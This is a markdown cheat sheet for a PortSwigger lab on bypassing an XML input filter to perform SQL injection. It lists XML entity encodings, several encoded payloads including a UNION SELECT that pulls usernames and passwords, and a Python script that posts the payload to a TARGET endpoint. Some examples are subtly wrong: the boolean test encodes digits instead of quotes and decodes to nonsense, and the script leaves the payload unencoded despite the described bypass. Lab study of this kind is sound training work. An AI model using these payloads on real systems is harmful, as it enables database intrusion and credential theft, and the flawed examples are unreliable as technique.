# SQL Injection - XML Encoding Bypass

## PortSwigger Lab: Filter bypass via XML encoding

### Vulnerability
- Input is XML-validated (rejects special chars like `'`, `"`, `=`)
- But XML numeric character references are decoded before SQL processing
- Bypass: Use XML entities to encode SQL injection

### XML Numeric Character References
```
&#39; → ' (single quote)
&#61; → = (equals)
&#34; → " (double quote)
&#40; → ( (open paren)
&#41; → ) (close paren)
&#32; → space
&#45; → - (minus/comment)
&#59; → ; (semicolon)
```

### Hex XML Entities
```
&#x27; → ' (single quote)
&#x3D; → = (equals)
&#x22; → " (double quote)
&#x28; → ( (open paren)
&#x29; → ) (close paren)
```

### Payload Examples

#### Basic boolean test (XML encoded)
```
&#x39; &#x31; &#x3D; &#x39; &#x31;--
```
Decoded: `9 1 = 9 1--`

#### UNION SELECT (XML encoded)
```
&#x31; UNION SELECT username, password FROM users--
```
Decoded: `1 UNION SELECT username, password FROM users--`

#### Blind boolean
```
&#x31; &#x41;&#x4E;&#x44; &#x31;&#x3D;&#x31;--
```
Decoded: `1 AND 1=1--`

### Attack Approach
1. Intercept POST request containing XML
2. Find the injectable parameter
3. Use XML numeric character references for SQL keywords
4. The XML parser decodes entities, then passes to SQL
5. Normal SQL injection techniques apply after decoding

### Python Script
```python
import requests

url = "https://TARGET/product/stock"
# XML with encoded SQL injection
xml = """<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1 UNION SELECT username, password FROM users--</productId>
  <storeId>1</storeId>
</stockCheck>"""

r = requests.post(url, data=xml, headers={"Content-Type": "application/xml"})
print(r.text)
```
